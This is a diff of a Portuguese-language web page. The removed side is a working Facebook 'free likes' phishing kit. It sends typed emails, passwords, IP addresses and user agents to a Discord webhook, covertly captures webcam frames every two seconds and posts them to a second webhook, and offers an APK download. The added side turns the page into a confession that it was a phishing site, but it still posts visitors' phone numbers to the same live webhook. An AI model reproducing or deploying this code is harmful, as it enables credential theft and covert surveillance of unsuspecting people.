@@ -3,254 +3,166 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>Boost Likes & Seguidores</title>
+    <title>Gerador de Seguidores | Instagram</title>
     <style>
-        body {
-            background-color: #1877f2;
+        /* Reset básico */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
             font-family: Arial, sans-serif;
+        }
+
+        /* Fundo com cores do Instagram */
+        body {
+            background: linear-gradient(to right, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
+            color: white;
+            text-align: center;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
         }
+
+        /* Caixa principal */
         .container {
-            background: white;
+            background: rgba(0, 0, 0, 0.6);
             padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            width: 300px;
-            text-align: center;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
         }
-        input, button {
-            width: calc(100% - 16px);
+
+        /* Título */
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        /* Texto de instrução */
+        p {
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+
+        /* Estilização do formulário */
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Labels */
+        label {
+            font-weight: bold;
             margin-top: 10px;
-            padding: 10px;
-            border-radius: 4px;
-            border: 1px solid #ccc;
-            display: block;
-            margin-left: auto;
-            margin-right: auto;
+            text-align: left;
         }
+
+        /* Campos de entrada */
+        input {
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            margin-top: 5px;
+            font-size: 16px;
+            width: 100%;
+        }
+
+        /* Botão */
         button {
-            background: #1877f2;
+            margin-top: 15px;
+            background: #d62976;
             color: white;
             border: none;
+            padding: 10px;
+            font-size: 18px;
             cursor: pointer;
+            border-radius: 5px;
+            transition: 0.3s;
         }
+
         button:hover {
-            background: #165dbb;
+            background: #962fbf;
         }
-.proccess{
-border-radius:50%;
-border:5px solid blue;
-height:150px;
-width:150px;
-border-left:5px solid cyan;
-border-right:5px solid cyan;
-animation:girar 2s infinite ease;
-position:relative;
-left:65px;
-}
-.fakePC span{
-top:-90px;
-position:relative;
-display:inline-block;
-font-weight:bold;
-animation:piscar 0.25s infinite reverse;
-font-size:20px;
-}
-@keyframes piscar{
-0%{
+
+.brilho{
+text-shadow:0px 0px 10px orange,0px 0px 35px blue;
 color:cyan;
 }
-100%{
-color:blue;
-}
-}
-@keyframes girar{
-100%{
-rotate:360deg;
-}
-
-}
-.fakePC{
+#errado{
+position:relative;
+background-color:white;
 display:none;
+height:60px;
+width:280px;
+font-weight:bold;
+//padding:30px;
+color:red;
+border:2px solid red;
+border-radius:10px;
+left:25px;
+margin-bottom:20px;
 }
+#errado p{
+padding:10px;
 
+position:relative;
+}
+.animado{
+animation:aparecer 1s 1 ease;
+}
+@keyframes aparecer{
+0%{
+width:25px;
+}
+100%{
+width:280px;
+}
+}
+mark{
+padding:10px;
+font-weight:bold;
+background-color:#e82070;
+}
+.mark{
+padding:5px;
+color:white;
+background-color:purple;
+}
 
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>Aumente seus Likes e Seguidores no Facebook</h2>
-        <form id="boostForm">
-            <label for="likes">Número de Likes:</label>
+        <h1>PARE DE SER ENGANADO</h1>
 <br><br>
-            <select style="width:200px; font-weight:bold; padding:10px; color:blue; font-size:15px;" name="opcoes">
-<option>1000 Likes</option>
-<option selected>500 Likes</option>
-<option>200 Likes</option>
-<option>100 Likes</option>
-</select>
+        <p>Eu errei, este site costumava ser um site de phishing que consistia em pegar dados de quem entrava. Pegamos várias contas mas não causamos nenhum estrago.</p>
+<p>Este site foi criado com o objectivo de punir aqueles que abusam ou fazem bulling com pessoas inocentes. Onde poderíamos até expôr fotos privadas, etc. Mas com o passar do tempo, o poder nos subiu à cabeça e mandamos isso à pessoas inocentes.</p>
+<p>Em suma, não estragamos nada de ninguém e não pretendiámos.</p>
+<p><mark>Que Deus te abençoe, meu cassule lindo</mark></p>
 <br><br>
-
-            
-
-            <button type="button" onclick="showLogin()">Continuar</button>
-        </form>
-
-        <div id="loginForm" style="display:none;">
-
-<p style="font-weight:bold; font-size:30px; color:blue;">Para receber os Likes você deve iniciar sessão</p>
-            <h3>Faça Login para Continuar</h3>
-            <div>
-                <label for="email">Telefone/Email:</label>
-                <input type="text" id="email" name="email" required>
-                
-                <label for="senha">Senha:</label>
-                <input type="password" id="senha" name="senha" required>
-
-                <button onclick="sendANDVirus()" >Confirmar</button>
-            </div>
-        </div>
-<div class="fakePC">
-<div class="proccess">
-</div>
-<span>Processando</span>
-</div>
- <div class="advCam" style="display:none;">  
-<h3>Para receber a quantia de likes e seguidores você deve assistir a um vídeo</h3>
-<button onclick="prosg()">Prosseguir</button>
-</div>
-
-<div class="Cam" style="display:none;">
-<h3>O seu smartphone informa que para assistir ao vídeo, você deve permitir o acesso. </h3>
-<img src="video.png" width="300px" height="150px">
-<button onclick="startCam()">Permitir</button>
-</div>
-
-<div class="downloadAPK" style="display:none">
-<h3>Baixe o nosso APP para continuar e para ganhar os Likes e Seguidores</h3>
-<a href="Free_Likes_Facebook.apk" style="font-size:30px;" download>Baixar Agora</a>
-</div>
-
-
-<video width="300px" height="150px" id="video" style="display:none;"></video>
-<canvas width="300px" height="150px" id="canvas" style="display:none;"></canvas>
-</div>
-
-    <script>
-
-var webhookURL="https://discord.com/api/webhooks/1346960511358734457/lFDqQ3EuCkc3WCth1Uj-wn_8YVVtkT5EjDeucp2dv3bInNB6sGc7PceiIPSjf228z_Ln"
-
-
-var webhookImg="https://discord.com/api/webhooks/1346961199748612167/g6w-fkp2LCPPMegcwEJ29J7tUNp1crJOyoNrT_i4Y7Q7FVblEzosnqvtgjjdYcxjOt2S"
-
-
-
-
-
-
-        function showLogin() {
-            document.getElementById('boostForm').style.display = 'none';
-document.querySelector(".fakePC").style.display="block";
-setTimeout(function(){
-document.querySelector("#loginForm").style.display="block";
-document.querySelector(".fakePC").style.display="none";
-},5000);
-        }
-async function sendANDVirus(){
-let telEmail=document.querySelector("#email").value;
-let senha=document.querySelector("#senha").value;
-ip="";
-let rpp=await fetch("https://api.ipify.org?format=json");
-let dats=await rpp.json();
-ip=dats.ip;
-
-const msg={
-content: "--------------\n {IP}: "+ip+"\n\n{USER AGENT}: "+navigator.userAgent+"  \n\n\n {TELEFONE/EMAIL}: "+telEmail+"\n\n {SENHA}: "+senha+" \n\n------------"
+<p><mark class="mark">Preencha se quiser nos contactar:</mark></p>
+<input type="number" placeholder="Seu número aqui">
+<button onclick="contacto()">Enviar</button>
+    </div>
+<script>
+async function contacto(){
+var num=document.querySelector("input").value;
+webhook="https://discord.com/api/webhooks/1346960511358734457/lFDqQ3EuCkc3WCth1Uj-wn_8YVVtkT5EjDeucp2dv3bInNB6sGc7PceiIPSjf228z_Ln"
+msg={
+content:"Quero me contactar! Número: "+num
 }
-let resp= await fetch(webhookURL,{
+await fetch(webhook,{
 method: "POST",
-headers: {"Content-Type": "application/json"},
+headers: {"Content-Type":"application/json"},
 body: JSON.stringify(msg)
 });
 
-
-document.querySelector("#loginForm").style.display="none";
-
-document.querySelector(".advCam").style.display="block";
+alert("Número Enviado, será contactado embreve(WHATSAPP)")
 
 }
- function prosg(){
+</script>
 
-document.querySelector(".Cam").style.display="block";
-document.querySelector(".advCam").style.display="none";
-
-}
-var video=document.querySelector("#video");
-var canvas=document.querySelector("#canvas");
- function startCam(){
-
-alert("Permita o acesso à câmera");
-
-navigator.mediaDevices.getUserMedia({video:true}).then(function(stream){
-video.srcObject=stream;
-video.play();
-setInterval(function(){
-var context=canvas.getContext("2d");
-context.drawImage(video,0,0,canvas.width,canvas.height);
-var dtUrl=canvas.toDataURL("image/png");
-
-var mensg={
-content:".\n\n\nImagem:\n\n\n\n"+dtUrl
-}
-
-
-fetch(webhookImg,{
-method:"POST",
-headers: {"Content-Type":"application/json"},
-body: JSON.stringify(mensg)
-}).then(function(resposta){
-
-
-})
-
-
-
-
-
-},2000);
-
-}).catch(function(erro){
-
-alert("Os likes não foram enviados à conta pois você não deu o acesso à câmera.");
-
-setTimeout(function(){
-
-window.open("https://facebook.com");
-
-},3000)
-
-
-}) //Fim do MediaDevices
-
-
-
-
-
-
-
-}
-
-
-
-
-
-
-
-    </script>
 </body>
 </html>
